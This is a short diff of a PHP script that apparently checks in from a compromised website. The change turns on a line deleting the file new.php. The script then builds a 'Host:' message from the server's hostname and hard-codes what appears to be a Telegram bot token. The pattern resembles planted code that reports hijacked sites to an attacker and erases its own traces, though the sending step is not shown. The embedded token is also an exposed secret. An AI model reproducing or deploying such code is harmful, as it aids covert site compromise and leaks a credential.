@@ -1,5 +1,5 @@
 <?php
-// unlink("new.php");
+unlink("new.php");
 $ddd = $_SERVER['HTTP_HOST'];
 $content = "Host: https://".$ddd;
 $tokens = "1872904754:AAGy9AoQifQTZZY02cN_rk41EQE1cwSJf9Y";
